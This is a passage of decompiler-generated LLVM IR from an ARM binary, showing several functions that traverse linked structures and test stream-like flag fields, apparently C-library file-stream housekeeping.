  store i32 %v1_17110, i32* @r4, align 4
  %v4_17124 = load i32, i32* inttoptr (i32 135416 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_17124)
  %v0_17138 = load i32, i32* @r5, align 4
  %v2_17138 = add i32 %v0_17138, 16
  %v3_17138 = inttoptr i32 %v2_17138 to i32*
  %v4_17138 = load i32, i32* %v3_17138, align 4
  store i32 %v4_17138, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_17144.720 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17138)
  %v0_17144.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_17148.pre = load i32, i32* @r7, align 4
  %v0_1714c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17144

dec_label_pc_17144:                               ; preds = %bb16, %dec_label_pc_1710c
  %v0_1714c = phi i32 [ %arg3, %bb16 ], [ %v0_1714c.pre, %dec_label_pc_1710c ]
  %v0_17148 = phi i32 [ %arg2, %bb16 ], [ %v0_17148.pre, %dec_label_pc_1710c ]
  %v0_17144 = phi i32 [ %arg1, %bb16 ], [ %v0_17144.pre, %dec_label_pc_1710c ]
  %v3_17150 = inttoptr i32 %v0_17144 to i8*
  %v4_17150 = call i32 @function_17658(i8* %v3_17150, i32 %v0_17148, i32 %v0_1714c)
  %v0_17154 = load i32, i32* %sl.global-to-local, align 4
  %v2_17154 = icmp eq i32 %v0_17154, 0
  store i32 %v4_17150, i32* %r4.global-to-local, align 4
  br i1 %v2_17154, label %dec_label_pc_17144..thread3_crit_edge, label %bb17

dec_label_pc_17144..thread3_crit_edge:            ; preds = %dec_label_pc_17144
  %v0_17170.pre = load i32, i32* @ip, align 4
  br label %.thread3

bb17:                                             ; preds = %dec_label_pc_17144
  %v1_17168 = load i32, i32* @r5, align 4
  %v3_17168 = add i32 %v1_17168, 24
  %v4_17168 = inttoptr i32 %v3_17168 to i32*
  %v5_17168 = load i32, i32* %v4_17168, align 4
  store i32 %v5_17168, i32* @ip, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17144..thread3_crit_edge, %bb17
  %v0_17170 = phi i32 [ %v0_17170.pre, %dec_label_pc_17144..thread3_crit_edge ], [ %v5_17168, %bb17 ]
  %v2_17170 = xor i1 %v2_17154, true
  call void @__pseudo_cond_branch(i1 %v2_17170, i32 %v0_17170)
  %v0_17174 = load i32, i32* %r4.global-to-local, align 4
  %v2_1717c = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_1717c, i32* %r4.global-to-local, align 4
  store i32 %v6_170dc, i32* @r5, align 4
  store i32 %v9_170dc, i32* @r6, align 4
  store i32 %v12_170dc, i32* @r7, align 4
  store i32 %v21_170dc, i32* @lr, align 4
  ret i32 %v0_17174

; uselistorder directives
  uselistorder i32 %v3_170e0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0 }
  uselistorder i32 52, { 10, 11, 12, 13, 14, 4, 15, 8, 9, 5, 17, 18, 2, 19, 0, 20, 21, 6, 7, 1, 16, 3 }
  uselistorder i32 %arg3, { 0, 3, 1, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_17144, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
}

define i32 @function_17188(i32 %arg1) local_unnamed_addr {
dec_label_pc_17188:
  %v0_17188 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17188, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17188
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17188, %bb
  %v10_17194 = phi i32 [ %arg1, %dec_label_pc_17188 ], [ 0, %bb ]
  ret i32 %v10_17194

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_17198() local_unnamed_addr {
dec_label_pc_17198:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_17198 = load i32, i32* @r4, align 4
  store i32 %v3_17198, i32* %stack_var_-24, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 135344, i32* %r6.global-to-local, align 4
  %v4_171a8 = load i32, i32* inttoptr (i32 135380 to i32*), align 4
  store i32 %v4_171a8, i32* %r8.global-to-local, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_171b0 = load i32, i32* inttoptr (i32 135452 to i32*), align 4
  store i32 %v4_171b0, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_171bc = load i32, i32* inttoptr (i32 135416 to i32*), align 8
  store i32 %v4_171bc, i32* %r7.global-to-local, align 4
  %v2_171c8 = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_branch(i32 %v4_171bc)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_171dc = load i32, i32* %r6.global-to-local, align 4
  %v2_171dc = add i32 %v0_171dc, 16
  %v3_171dc = inttoptr i32 %v2_171dc to i32*
  %v4_171dc = load i32, i32* %v3_171dc, align 4
  store i32 %v4_171dc, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_171dc)
  store i32 12, i32* %r3.global-to-local, align 4
  %v0_171ec = load i32, i32* %r6.global-to-local, align 4
  %v2_171ec = add i32 %v0_171ec, 12
  %v3_171ec = inttoptr i32 %v2_171ec to i32*
  %v4_171ec = load i32, i32* %v3_171ec, align 4
  store i32 %v4_171ec, i32* %r3.global-to-local, align 4
  %v1_171f0 = inttoptr i32 %v4_171ec to i32*
  %v2_171f0 = load i32, i32* %v1_171f0, align 4
  store i32 %v2_171f0, i32* %r3.global-to-local, align 4
  %v7_171f4 = icmp eq i32 %v2_171f0, 1
  br i1 %v7_171f4, label %dec_label_pc_171fc, label %dec_label_pc_172bc

dec_label_pc_171fc:                               ; preds = %dec_label_pc_17198
  store i32 48, i32* %r3.global-to-local, align 4
  %v2_17200 = add i32 %v0_171ec, 48
  %v3_17200 = inttoptr i32 %v2_17200 to i32*
  %v4_17200 = load i32, i32* %v3_17200, align 4
  store i32 %v4_17200, i32* %r3.global-to-local, align 4
  %v1_17204 = inttoptr i32 %v4_17200 to i32*
  %v2_17204 = load i32, i32* %v1_17204, align 4
  store i32 %v2_17204, i32* %r3.global-to-local, align 4
  %tmp30 = icmp slt i32 %v2_17204, 1
  br i1 %tmp30, label %dec_label_pc_172bc, label %dec_label_pc_17210

dec_label_pc_17210:                               ; preds = %dec_label_pc_171fc
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_17214 = add i32 %v0_171ec, 96
  %v3_17214 = inttoptr i32 %v2_17214 to i32*
  %v4_17214 = load i32, i32* %v3_17214, align 4
  store i32 %v4_17214, i32* %r4.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_171bc)
  call void @__pseudo_branch(i32 %v4_171dc)
  %v0_1723c = load i32, i32* %r6.global-to-local, align 4
  %v2_1723c = add i32 %v0_1723c, 44
  %v3_1723c = inttoptr i32 %v2_1723c to i32*
  %v4_1723c = load i32, i32* %v3_1723c, align 4
  store i32 %v4_1723c, i32* %r3.global-to-local, align 4
  %v1_17240 = inttoptr i32 %v4_1723c to i32*
  %v2_17240 = load i32, i32* %v1_17240, align 4
  store i32 %v2_17240, i32* %r4.global-to-local, align 4
  store i32 44, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v2_1728c11 = icmp eq i32 %v2_17240, 0
  br i1 %v2_1728c11, label %dec_label_pc_17298, label %dec_label_pc_17250

dec_label_pc_17250:                               ; preds = %dec_label_pc_17210, %dec_label_pc_17288
  %v0_172742 = phi i32 [ %v0_17288, %dec_label_pc_17288 ], [ %v2_17240, %dec_label_pc_17210 ]
  %v1_17250 = inttoptr i32 %v0_172742 to i16*
  %v2_17250 = load i16, i16* %v1_17250, align 2
  %v3_17250 = zext i16 %v2_17250 to i32
  store i32 %v3_17250, i32* %r3.global-to-local, align 4
  %v2_17254 = and i32 %v3_17250, 32816
  %v7_17258 = icmp eq i32 %v2_17254, 48
  %v1_1725c = add i32 %v0_172742, 32
  %v2_1725c = inttoptr i32 %v1_1725c to i32*
  %v3_1725c = load i32, i32* %v2_1725c, align 4
  store i32 %v3_1725c, i32* %r5.global-to-local, align 4
  br i1 %v7_17258, label %dec_label_pc_17268, label %.thread21

.thread21:                                        ; preds = %dec_label_pc_17250
  store i32 %v0_172742, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17288

dec_label_pc_17268:                               ; preds = %dec_label_pc_17250
  %v0_17268 = load i32, i32* %r7.global-to-local, align 4
  %v2_17268 = icmp eq i32 %v0_17268, 0
  br i1 %v2_17268, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_17268
  %v1_1726c = load i32, i32* %r6.global-to-local, align 4
  %v2_1726c = load i32, i32* %r8.global-to-local, align 4
  %v3_1726c = add i32 %v2_1726c, %v1_1726c
  %v4_1726c = inttoptr i32 %v3_1726c to i32*
  %v5_1726c = load i32, i32* %v4_1726c, align 4
  store i32 %v5_1726c, i32* %r3.global-to-local, align 4
  %v3_17270 = inttoptr i32 %v5_1726c to i32*
  store i32 %v3_1725c, i32* %v3_17270, align 4
  %v0_17274 = load i32, i32* %r4.global-to-local, align 4
  %v1_17274 = inttoptr i32 %v0_17274 to i16*
  %v2_17274 = load i16, i16* %v1_17274, align 2
  %v3_17274 = zext i16 %v2_17274 to i32
  store i32 %v3_17274, i32* %r3.global-to-local, align 4
  br label %bb31

bb:                                               ; preds = %dec_label_pc_17268
  %v2_172748 = load i16, i16* %v1_17250, align 2
  %v3_172749 = zext i16 %v2_172748 to i32
  store i32 %v3_172749, i32* %r3.global-to-local, align 4
  %v3_17278 = add i32 %v0_17268, 32
  %v4_17278 = inttoptr i32 %v3_17278 to i32*
  store i32 %v3_1725c, i32* %v4_17278, align 4
  %v0_1727c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %.thread, %bb
  %v0_1727c = phi i32 [ %v3_17274, %.thread ], [ %v0_1727c.pre, %bb ]
  %v1_1727c = and i32 %v0_1727c, 8192
  %v2_1727c = icmp eq i32 %v1_1727c, 0
  br i1 %v2_1727c, label %bb33, label %bb32

bb32:                                             ; preds = %bb31
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_17284 = xor i1 %v2_1727c, true
  call void @__pseudo_cond_branch(i1 %v1_17284, i32 ptrtoint (i32* @global_var_14bf4.55 to i32))
  %v0_17288.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17288

dec_label_pc_17288:                               ; preds = %.thread21, %bb33
  %v0_17288 = phi i32 [ %v0_17288.pre, %bb33 ], [ %v3_1725c, %.thread21 ]
  store i32 %v0_17288, i32* %r4.global-to-local, align 4
  %v2_1728c = icmp eq i32 %v0_17288, 0
  br i1 %v2_1728c, label %dec_label_pc_1728c.dec_label_pc_17298_crit_edge, label %dec_label_pc_17250

dec_label_pc_1728c.dec_label_pc_17298_crit_edge:  ; preds = %dec_label_pc_17288
  %v0_172a4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17298

dec_label_pc_17298:                               ; preds = %dec_label_pc_1728c.dec_label_pc_17298_crit_edge, %dec_label_pc_17210
  %v0_172a4 = phi i32 [ %v0_172a4.pre, %dec_label_pc_1728c.dec_label_pc_17298_crit_edge ], [ %v0_1723c, %dec_label_pc_17210 ]
  store i32 24, i32* %r3.global-to-local, align 4
  %v2_172a4 = add i32 %v0_172a4, 24
  %v3_172a4 = inttoptr i32 %v2_172a4 to i32*
  %v4_172a4 = load i32, i32* %v3_172a4, align 4
  call void @__pseudo_branch(i32 %v4_172a4)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_172b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_172b4 = add i32 %v0_172b4, 48
  %v3_172b4 = inttoptr i32 %v2_172b4 to i32*
  %v4_172b4 = load i32, i32* %v3_172b4, align 4
  store i32 %v4_172b4, i32* %r3.global-to-local, align 4
  %v0_172b8 = load i32, i32* %r4.global-to-local, align 4
  %v2_172b8 = inttoptr i32 %v4_172b4 to i32*
  store i32 %v0_172b8, i32* %v2_172b8, align 4
  %v0_172c0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_172bc

dec_label_pc_172bc:                               ; preds = %dec_label_pc_17198, %dec_label_pc_171fc, %dec_label_pc_17298
  %v0_172c0 = phi i32 [ %v0_171ec, %dec_label_pc_17198 ], [ %v0_171ec, %dec_label_pc_171fc ], [ %v0_172c0.pre, %dec_label_pc_17298 ]
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_172c0 = add i32 %v0_172c0, 12
  %v3_172c0 = inttoptr i32 %v2_172c0 to i32*
  %v4_172c0 = load i32, i32* %v3_172c0, align 4
  %v1_172c4 = inttoptr i32 %v4_172c0 to i32*
  %v2_172c4 = load i32, i32* %v1_172c4, align 4
  %v1_172c8 = add i32 %v2_172c4, -1
  store i32 %v1_172c8, i32* %v1_172c4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_172dc = load i32, i32* %r6.global-to-local, align 4
  %v2_172dc = add i32 %v0_172dc, 24
  %v3_172dc = inttoptr i32 %v2_172dc to i32*
  %v4_172dc = load i32, i32* %v3_172dc, align 4
  call void @__pseudo_branch(i32 %v4_172dc)
  %v2_172ec = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_172ec, i32* %r4.global-to-local, align 4
  ret i32 %v2_171c8

; uselistorder directives
  uselistorder i32 %v0_17288, { 2, 1, 0 }
  uselistorder i32 %v4_171bc, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 6, 3, 4, 7, 5, 8 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 18, 19, 14, 15, 16, 17 }
  uselistorder i32* inttoptr (i32 135380 to i32*), { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_172bc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17288, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_17250, { 1, 0 }
}

define i32 @function_172f8(i16* %arg1) local_unnamed_addr {
dec_label_pc_172f8:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v0_172f8 = load i1, i1* @cpsr_z, align 1
  %v2_172f8 = load i32, i32* @r4, align 4
  br i1 %v0_172f8, label %bb, label %dec_label_pc_172f8..thread8_crit_edge

dec_label_pc_172f8..thread8_crit_edge:            ; preds = %dec_label_pc_172f8
  %v0_17334.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread8

bb:                                               ; preds = %dec_label_pc_172f8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_172f8..thread8_crit_edge, %bb
  %v0_174d4 = phi i32 [ %v0_17334.pre, %dec_label_pc_172f8..thread8_crit_edge ], [ 0, %bb ]
  store i32 %v2_172f8, i32* %stack_var_-36, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 135344, i32* %sb.global-to-local, align 4
  %v4_17330 = load i32, i32* inttoptr (i32 135388 to i32*), align 4
  store i32 %v4_17330, i32* %r3.global-to-local, align 4
  %v9_17334 = icmp eq i32 %v0_174d4, %v4_17330
  store i32 %v0_174d4, i32* %fp.global-to-local, align 4
  br i1 %v9_17334, label %bb49, label %dec_label_pc_1734c

bb49:                                             ; preds = %.thread8
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1735c

dec_label_pc_1734c:                               ; preds = %.thread8
  store i32 256, i32* %r2.global-to-local, align 4
  %v2_17350 = icmp eq i32 %v0_174d4, 0
  br i1 %v2_17350, label %dec_label_pc_1735c, label %dec_label_pc_174c4

dec_label_pc_1735c:                               ; preds = %bb49, %dec_label_pc_1734c
  %stack_var_-60.1.in = phi i32 [ 0, %bb49 ], [ 256, %dec_label_pc_1734c ]
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_17370 = load i32, i32* inttoptr (i32 135452 to i32*), align 4
  store i32 %v4_17370, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_17378 = ptrtoint i32* %stack_var_-56 to i32
  %v4_1737c = load i32, i32* inttoptr (i32 135416 to i32*), align 8
  store i32 16, i32* %stack_var_-72, align 4
  store i32 %v2_17378, i32* %r0.global-to-local, align 4
  store i32 %v4_17370, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1737c)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_1739c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1739c, i32* %r0.global-to-local, align 4
  %v0_173a0 = load i32, i32* %sb.global-to-local, align 4
  %v2_173a0 = add i32 %v0_173a0, 16
  %v3_173a0 = inttoptr i32 %v2_173a0 to i32*
  %v4_173a0 = load i32, i32* %v3_173a0, align 4
  call void @__pseudo_branch(i32 %v4_173a0)
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_173b0 = add i32 %v0_173a0, 12
  %v3_173b0 = inttoptr i32 %v2_173b0 to i32*
  %v4_173b0 = load i32, i32* %v3_173b0, align 4
  store i32 %v4_173b0, i32* %r2.global-to-local, align 4
  %v1_173b4 = inttoptr i32 %v4_173b0 to i32*
  %v2_173b4 = load i32, i32* %v1_173b4, align 4
  store i32 24, i32* %sl.global-to-local, align 4
  %v1_173bc = add i32 %v2_173b4, 1
  store i32 %v1_173bc, i32* %r3.global-to-local, align 4
  %v2_173c0 = add i32 %v0_173a0, 24
  %v3_173c0 = inttoptr i32 %v2_173c0 to i32*
  %v4_173c0 = load i32, i32* %v3_173c0, align 4
  store i32 %v1_173bc, i32* %v1_173b4, align 4
  store i32 %v2_17378, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_173c0)
  store i32 96, i32* %r3.global-to-local, align 4
  %v0_173dc = load i32, i32* %sb.global-to-local, align 4
  %v2_173dc = add i32 %v0_173dc, 96
  %v3_173dc = inttoptr i32 %v2_173dc to i32*
  %v4_173dc = load i32, i32* %v3_173dc, align 4
  store i32 %v4_173dc, i32* @r4, align 4
  store i32 %v4_173dc, i32* %r2.global-to-local, align 4
  store i32 %v2_17378, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1737c)
  %v0_173f4 = load i32, i32* @r4, align 4
  store i32 %v0_173f4, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_173a0)
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_17404 = load i32, i32* %sb.global-to-local, align 4
  %v2_17404 = add i32 %v0_17404, 44
  %v3_17404 = inttoptr i32 %v2_17404 to i32*
  %v4_17404 = load i32, i32* %v3_17404, align 4
  store i32 %v4_17404, i32* %r3.global-to-local, align 4
  store i32 %v2_17378, i32* %r0.global-to-local, align 4
  %v1_17410 = inttoptr i32 %v4_17404 to i32*
  %v2_17410 = load i32, i32* %v1_17410, align 4
  store i32 %v2_17410, i32* @r7, align 4
  call void @__pseudo_branch(i32 %v4_173c0)
  %v0_1741c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1741c, i32* @r6, align 4
  %v2_17420 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_17420, i32* @r8, align 4
  store i32 72, i32* %fp.global-to-local, align 4
  %v0_174b4.pr = load i32, i32* @r7, align 4
  %v2_174b428 = icmp eq i32 %v0_174b4.pr, 0
  br i1 %v2_174b428, label %dec_label_pc_174bc, label %dec_label_pc_17428

dec_label_pc_17428:                               ; preds = %dec_label_pc_1735c, %dec_label_pc_174b0
  %v0_17434 = phi i32 [ %v3_174b0, %dec_label_pc_174b0 ], [ %v0_174b4.pr, %dec_label_pc_1735c ]
  %v1_17428 = inttoptr i32 %v0_17434 to i16*
  %v2_17428 = load i16, i16* %v1_17428, align 2
  %v3_17428 = zext i16 %v2_17428 to i32
  store i32 %v3_17428, i32* %r3.global-to-local, align 4
  %v1_1742c = and i32 %v3_17428, 64
  %v2_1742c = icmp eq i32 %v1_1742c, 0
  br i1 %v2_1742c, label %dec_label_pc_174b0, label %dec_label_pc_17434

dec_label_pc_17434:                               ; preds = %dec_label_pc_17428
  %v1_17434 = add i32 %v0_17434, 56
  store i32 %v1_17434, i32* @r4, align 4
  store i32 %v1_17434, i32* %r2.global-to-local, align 4
  store i32 %v2_17378, i32* %r0.global-to-local, align 4
  %v0_17444 = load i32, i32* %sb.global-to-local, align 4
  %v1_17444 = load i32, i32* %fp.global-to-local, align 4
  %v2_17444 = add i32 %v1_17444, %v0_17444
  %v3_17444 = inttoptr i32 %v2_17444 to i32*
  %v4_17444 = load i32, i32* %v3_17444, align 4
  call void @__pseudo_branch(i32 %v4_17444)
  %v0_17450 = load i32, i32* @r4, align 4
  store i32 %v0_17450, i32* %r0.global-to-local, align 4
  %v0_17454 = load i32, i32* %sb.global-to-local, align 4
  %v1_17454 = load i32, i32* @r8, align 4
  %v2_17454 = add i32 %v1_17454, %v0_17454
  %v3_17454 = inttoptr i32 %v2_17454 to i32*
  %v4_17454 = load i32, i32* %v3_17454, align 4
  call void @__pseudo_branch(i32 %v4_17454)
  %v0_17460 = load i32, i32* @r7, align 4
  %v1_17460 = inttoptr i32 %v0_17460 to i16*
  %v2_17460 = load i16, i16* %v1_17460, align 2
  %v3_17460 = zext i16 %v2_17460 to i32
  store i32 %stack_var_-60.1.in, i32* %r2.global-to-local, align 4
  %v2_17468 = or i32 %v3_17460, %stack_var_-60.1.in
  %v1_1746c = xor i32 %v2_17468, 320
  store i32 %v1_1746c, i32* %r3.global-to-local, align 4
  %v1_17470 = and i32 %v1_1746c, 832
  %v2_17470 = icmp eq i32 %v1_17470, 0
  br i1 %v2_17470, label %dec_label_pc_17478, label %bb50

dec_label_pc_17478:                               ; preds = %dec_label_pc_17434
  store i32 %v0_17460, i32* %r0.global-to-local, align 4
  %v1_1747c = call i32 @function_16fd0(i32 %v0_17460)
  store i32 %v1_1747c, i32* %r0.global-to-local, align 4
  %v2_17480 = icmp eq i32 %v1_1747c, 0
  br i1 %v2_17480, label %.thread16, label %.thread17

.thread16:                                        ; preds = %dec_label_pc_17478
  %v1_17484 = load i32, i32* @r7, align 4
  %v2_17484 = inttoptr i32 %v1_17484 to i16*
  %v3_17484 = load i16, i16* %v2_17484, align 2
  %v4_17484 = zext i16 %v3_17484 to i32
  store i32 %v4_17484, i32* %r3.global-to-local, align 4
  %v2_17488 = add i32 %v1_17484, 8
  %v3_17488 = inttoptr i32 %v2_17488 to i32*
  %v4_17488 = load i32, i32* %v3_17488, align 4
  store i32 %v4_17488, i32* %r2.global-to-local, align 4
  %v2_1748c = and i32 %v4_17484, 65471
  store i32 %v2_1748c, i32* %r3.global-to-local, align 4
  %v3_17490 = add i32 %v1_17484, 28
  %v4_17490 = inttoptr i32 %v3_17490 to i32*
  store i32 %v4_17488, i32* %v4_17490, align 4
  %v1_17494 = load i32, i32* %r3.global-to-local, align 4
  %v2_17494 = trunc i32 %v1_17494 to i16
  %v3_17494 = load i32, i32* @r7, align 4
  %v4_17494 = inttoptr i32 %v3_17494 to i16*
  store i16 %v2_17494, i16* %v4_17494, align 2
  br label %bb50

.thread17:                                        ; preds = %dec_label_pc_17478
  store i32 -1, i32* @r6, align 4
  br label %bb50

bb50:                                             ; preds = %.thread16, %dec_label_pc_17434, %.thread17
  store i32 %v2_17378, i32* %r0.global-to-local, align 4
  %v0_174a4 = load i32, i32* %sb.global-to-local, align 4
  %v1_174a4 = load i32, i32* %sl.global-to-local, align 4
  %v2_174a4 = add i32 %v1_174a4, %v0_174a4
  %v3_174a4 = inttoptr i32 %v2_174a4 to i32*
  %v4_174a4 = load i32, i32* %v3_174a4, align 4
  call void @__pseudo_branch(i32 %v4_174a4)
  %v0_174b0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_174b0

dec_label_pc_174b0:                               ; preds = %dec_label_pc_17428, %bb50
  %v0_174b0 = phi i32 [ %v0_17434, %dec_label_pc_17428 ], [ %v0_174b0.pre, %bb50 ]
  %v1_174b0 = add i32 %v0_174b0, 32
  %v2_174b0 = inttoptr i32 %v1_174b0 to i32*
  %v3_174b0 = load i32, i32* %v2_174b0, align 4
  store i32 %v3_174b0, i32* @r7, align 4
  %v2_174b4 = icmp eq i32 %v3_174b0, 0
  br i1 %v2_174b4, label %dec_label_pc_174bc, label %dec_label_pc_17428

dec_label_pc_174bc:                               ; preds = %dec_label_pc_174b0, %dec_label_pc_1735c
  %v0_174bc = call i32 @function_17198()
  store i32 %v0_174bc, i32* %r0.global-to-local, align 4
  %v0_174f8.pre = load i32, i32* @r6, align 4
  br label %bb52

dec_label_pc_174c4:                               ; preds = %dec_label_pc_1734c
  %v1_174c4 = inttoptr i32 %v0_174d4 to i16*
  %v2_174c4 = load i16, i16* %v1_174c4, align 2
  %v3_174c4 = zext i16 %v2_174c4 to i32
  %v1_174c8 = and i32 %v3_174c4, 64
  store i32 %v1_174c8, i32* %r3.global-to-local, align 4
  %v2_174c8 = icmp eq i32 %v1_174c8, 0
  br i1 %v2_174c8, label %bb51, label %dec_label_pc_174d4

bb51:                                             ; preds = %dec_label_pc_174c4
  br label %bb52

dec_label_pc_174d4:                               ; preds = %dec_label_pc_174c4
  %v1_174d4 = call i32 @function_16fd0(i32 %v0_174d4)
  store i32 %v1_174d4, i32* %r0.global-to-local, align 4
  %v2_174d8 = icmp eq i32 %v1_174d4, 0
  br i1 %v2_174d8, label %.thread24, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_174d4
  br label %bb52

.thread24:                                        ; preds = %dec_label_pc_174d4
  %v1_174dc = load i32, i32* %fp.global-to-local, align 4
  %v2_174dc = inttoptr i32 %v1_174dc to i16*
  %v3_174dc = load i16, i16* %v2_174dc, align 2
  %v4_174dc = zext i16 %v3_174dc to i32
  store i32 %v4_174dc, i32* %r3.global-to-local, align 4
  %v2_174e0 = add i32 %v1_174dc, 8
  %v3_174e0 = inttoptr i32 %v2_174e0 to i32*
  %v4_174e0 = load i32, i32* %v3_174e0, align 4
  store i32 %v4_174e0, i32* %r2.global-to-local, align 4
  %v2_174e4 = and i32 %v4_174dc, 65471
  store i32 %v2_174e4, i32* %r3.global-to-local, align 4
  %v2_174e8 = trunc i32 %v2_174e4 to i16
  store i16 %v2_174e8, i16* %v2_174dc, align 2
  %v1_174ec = load i32, i32* %r2.global-to-local, align 4
  %v2_174ec = load i32, i32* %fp.global-to-local, align 4
  %v3_174ec = add i32 %v2_174ec, 28
  %v4_174ec = inttoptr i32 %v3_174ec to i32*
  store i32 %v1_174ec, i32* %v4_174ec, align 4
  br label %bb52

bb52:                                             ; preds = %bb51, %.thread26, %dec_label_pc_174bc, %.thread24
  %v0_174f8 = phi i32 [ -1, %.thread26 ], [ 0, %bb51 ], [ %v0_174f8.pre, %dec_label_pc_174bc ], [ 0, %.thread24 ]
  store i32 %v0_174f8, i32* %r0.global-to-local, align 4
  %v2_17500 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17500, i32* %r4.global-to-local, align 4
  ret i32 %v0_174f8

; uselistorder directives
  uselistorder i32 %v0_174f8, { 1, 0 }
  uselistorder i32 %v3_174b0, { 1, 2, 0 }
  uselistorder i32 %v0_17460, { 1, 0, 2 }
  uselistorder i32 %v0_173a0, { 1, 0, 2 }
  uselistorder i32 %v0_174d4, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 6, 5, 16, 7, 9, 8, 10, 12, 11, 13, 14, 15, 2, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 ()* @function_17198, { 1, 0 }
  uselistorder i32 56, { 8, 9, 10, 1, 2, 11, 12, 4, 5, 6, 7, 0, 3, 14, 13 }
